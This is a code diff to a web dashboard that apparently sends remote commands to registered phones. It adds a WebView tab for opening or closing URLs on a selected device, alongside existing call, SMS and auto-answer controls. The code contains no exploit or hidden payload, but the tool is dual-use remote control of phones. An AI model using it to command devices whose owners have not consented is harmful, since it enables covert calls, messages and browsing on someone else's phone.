@@ -787,13 +787,15 @@
         <section class="grid">
             <article class="card full-width">
                 <h2>Command Center</h2>
-                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer Toggle">
+                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer WebView Toggle">
                     <button id="callTabBtn" class="segmented-option active" role="tab" aria-selected="true"
                         onclick="setActionTab('call')">Call</button>
                     <button id="smsTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('sms')">SMS</button>
                     <button id="autoAnswerTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('auto_answer')">Auto Answer</button>
+                    <button id="webViewTabBtn" class="segmented-option" role="tab" aria-selected="false"
+                        onclick="setActionTab('webview')">WebView</button>
                 </div>
                 <div id="callTabPanel" class="tab-panel active">
                     <h2>Send Call</h2>
@@ -853,6 +855,27 @@
                         <button onclick="sendAutoAnswer()">Apply Auto Answer</button>
                     </div>
                 </div>
+                <div id="webViewTabPanel" class="tab-panel">
+                    <h2>WebView Commands</h2>
+                    <div class="segmented-control" role="tablist" aria-label="WebView command action toggle">
+                        <button id="openUrlActionBtn" class="segmented-option active" role="tab" aria-selected="true"
+                            onclick="setWebViewCommandAction('open_url')">OPEN_URL</button>
+                        <button id="closeWebViewActionBtn" class="segmented-option" role="tab" aria-selected="false"
+                            onclick="setWebViewCommandAction('close_webview')">CLOSE_WEBVIEW</button>
+                    </div>
+                    <div class="input-row auto-answer-input-grid">
+                        <select id="deviceSelectWebView"></select>
+                        <div id="openUrlFieldGroup" class="field-group">
+                            <input id="webViewUrl" placeholder="https://example.com" />
+                        </div>
+                        <div id="webViewNotesFieldGroup" class="field-group">
+                            <input id="webViewNotes" placeholder="optional notes" />
+                        </div>
+                    </div>
+                    <div class="actions">
+                        <button id="sendWebViewCommandBtn" onclick="sendWebViewCommand()">Send OPEN_URL</button>
+                    </div>
+                </div>
             </article>
 
             <article id="devicesPanel" class="card full-width">
@@ -901,6 +924,7 @@
                 ? "http://localhost:4000"
                 : "https://serverautocall-production.up.railway.app";
         let activeTab = "call";
+        let activeWebViewAction = "open_url";
         const panelVisibility = {
             devices: false,
             commands: false
@@ -921,7 +945,8 @@
         const tabOrder = {
             call: 0,
             sms: 1,
-            auto_answer: 2
+            auto_answer: 2,
+            webview: 3
         };
         const deviceNameByUid = new Map();
 
@@ -1124,6 +1149,7 @@
                 const type = escapeHtml(asDisplayValue(command.type));
                 const phone = escapeHtml(asDisplayValue(command.phoneNumber));
                 const message = escapeHtml(asDisplayValue(command.message));
+                const url = escapeHtml(asDisplayValue(command.url));
                 const notes = escapeHtml(asDisplayValue(command.notes));
                 const status = escapeHtml(formatCommandStatus(command.status));
                 const createdAt = escapeHtml(asDisplayValue(command.createdAt));
@@ -1136,6 +1162,7 @@
                         <td>${createdAt}</td>
                         <td>${phone}</td>
                         <td>${message}</td>
+                        <td>${url}</td>
                         <td>${notes}</td>
                     </tr>
                 `;
@@ -1151,6 +1178,7 @@
                             <th>Created At</th>
                             <th>Phone</th>
                             <th>Message</th>
+                            <th>URL</th>
                             <th>Notes</th>
                         </tr>
                     </thead>
@@ -1166,19 +1194,28 @@
             const isCall = activeTab === "call";
             const isSms = activeTab === "sms";
             const isAutoAnswer = activeTab === "auto_answer";
+            const isWebView = activeTab === "webview";
 
             const callPanel = document.getElementById("callTabPanel");
             const smsPanel = document.getElementById("smsTabPanel");
             const autoAnswerPanel = document.getElementById("autoAnswerTabPanel");
-            const panels = [callPanel, smsPanel, autoAnswerPanel];
+            const webViewPanel = document.getElementById("webViewTabPanel");
+            const panels = [callPanel, smsPanel, autoAnswerPanel, webViewPanel];
             panels.forEach((panel) => panel.classList.remove("tab-enter-left", "tab-enter-right"));
 
             callPanel.classList.toggle("active", isCall);
             smsPanel.classList.toggle("active", isSms);
             autoAnswerPanel.classList.toggle("active", isAutoAnswer);
+            webViewPanel.classList.toggle("active", isWebView);
 
             if (targetTab !== previousTab) {
-                const targetPanel = isCall ? callPanel : isSms ? smsPanel : autoAnswerPanel;
+                const targetPanel = isCall
+                    ? callPanel
+                    : isSms
+                        ? smsPanel
+                        : isAutoAnswer
+                            ? autoAnswerPanel
+                            : webViewPanel;
                 const movingForward = tabOrder[targetTab] > tabOrder[previousTab];
                 const animationClass = movingForward ? "tab-enter-right" : "tab-enter-left";
                 void targetPanel.offsetWidth;
@@ -1188,10 +1225,12 @@
             document.getElementById("callTabBtn").classList.toggle("active", isCall);
             document.getElementById("smsTabBtn").classList.toggle("active", isSms);
             document.getElementById("autoAnswerTabBtn").classList.toggle("active", isAutoAnswer);
+            document.getElementById("webViewTabBtn").classList.toggle("active", isWebView);
 
             document.getElementById("callTabBtn").setAttribute("aria-selected", String(isCall));
             document.getElementById("smsTabBtn").setAttribute("aria-selected", String(isSms));
             document.getElementById("autoAnswerTabBtn").setAttribute("aria-selected", String(isAutoAnswer));
+            document.getElementById("webViewTabBtn").setAttribute("aria-selected", String(isWebView));
         }
 
         function updatePanelToggleUI(panelName) {
@@ -1333,21 +1372,26 @@
                 const callSelect = document.getElementById("deviceSelect");
                 const smsSelect = document.getElementById("deviceSelectSms");
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
+                const webViewSelect = document.getElementById("deviceSelectWebView");
                 const previousCallValue = callSelect.value;
                 const previousSmsValue = smsSelect.value;
                 const previousAutoAnswerValue = autoAnswerSelect.value;
+                const previousWebViewValue = webViewSelect.value;
 
                 rememberDevices(data);
                 populateDeviceSelect(callSelect, data, previousCallValue);
                 populateDeviceSelect(smsSelect, data, previousSmsValue);
                 populateDeviceSelect(autoAnswerSelect, data, previousAutoAnswerValue);
+                populateDeviceSelect(webViewSelect, data, previousWebViewValue);
             } catch (error) {
                 const callSelect = document.getElementById("deviceSelect");
                 const smsSelect = document.getElementById("deviceSelectSms");
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
+                const webViewSelect = document.getElementById("deviceSelectWebView");
                 populateDeviceSelect(callSelect, [], "");
                 populateDeviceSelect(smsSelect, [], "");
                 populateDeviceSelect(autoAnswerSelect, [], "");
+                populateDeviceSelect(webViewSelect, [], "");
             }
         }
 
@@ -1401,6 +1445,89 @@
             const parsed = Number(rawValue);
             if (!Number.isInteger(parsed) || parsed <= 0) return null;
             return parsed;
+        }
+
+        function isValidHttpUrl(value) {
+            if (typeof value !== "string") return false;
+            const trimmed = value.trim();
+            if (!trimmed) return false;
+            try {
+                const parsed = new URL(trimmed);
+                return parsed.protocol === "http:" || parsed.protocol === "https:";
+            } catch (_error) {
+                return false;
+            }
+        }
+
+        function setWebViewCommandAction(action) {
+            const normalizedAction = action === "close_webview" ? "close_webview" : "open_url";
+            activeWebViewAction = normalizedAction;
+            const isOpenUrl = normalizedAction === "open_url";
+
+            const openUrlBtn = document.getElementById("openUrlActionBtn");
+            const closeWebViewBtn = document.getElementById("closeWebViewActionBtn");
+            const openUrlFieldGroup = document.getElementById("openUrlFieldGroup");
+            const webViewNotesFieldGroup = document.getElementById("webViewNotesFieldGroup");
+            const sendButton = document.getElementById("sendWebViewCommandBtn");
+
+            openUrlBtn.classList.toggle("active", isOpenUrl);
+            closeWebViewBtn.classList.toggle("active", !isOpenUrl);
+            openUrlBtn.setAttribute("aria-selected", String(isOpenUrl));
+            closeWebViewBtn.setAttribute("aria-selected", String(!isOpenUrl));
+
+            openUrlFieldGroup.style.display = isOpenUrl ? "grid" : "none";
+            webViewNotesFieldGroup.style.display = isOpenUrl ? "grid" : "none";
+            sendButton.textContent = isOpenUrl ? "Send OPEN_URL" : "Send CLOSE_WEBVIEW";
+            sendButton.classList.toggle("danger-button", !isOpenUrl);
+        }
+
+        async function sendWebViewCommand() {
+            const deviceUid = document.getElementById("deviceSelectWebView").value;
+            const notes = document.getElementById("webViewNotes").value.trim();
+            const isOpenUrl = activeWebViewAction === "open_url";
+
+            if (!deviceUid) {
+                showToast("Please select a device first", "error");
+                return;
+            }
+
+            const payload = {
+                deviceUid,
+                action: isOpenUrl ? "open_url" : "close_webview",
+                type: isOpenUrl ? "OPEN_URL" : "CLOSE_WEBVIEW"
+            };
+
+            if (isOpenUrl) {
+                const rawUrl = document.getElementById("webViewUrl").value.trim();
+                if (!rawUrl) {
+                    showToast("URL is required for OPEN_URL", "error");
+                    return;
+                }
+                if (!isValidHttpUrl(rawUrl)) {
+                    showToast("URL must start with http:// or https://", "error");
+                    return;
+                }
+                payload.url = rawUrl;
+                payload.notes = notes || null;
+            }
+
+            try {
+                const res = await fetch(SERVER + "/commands", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || "Failed to send WebView command");
+
+                showToast(isOpenUrl ? "OPEN_URL command sent" : "CLOSE_WEBVIEW command sent", "success");
+                await loadCommands();
+            } catch (error) {
+                showToast(error.message, "error");
+            }
         }
 
         async function sendCall() {
@@ -1573,6 +1700,7 @@
         loadDevicesToSelect();
         loadDevices();
         loadCommands();
+        setWebViewCommandAction("open_url");
         updatePanelToggleUI("devices");
         updatePanelToggleUI("commands");
         setInterval(loadDevicesToSelect, 10000);
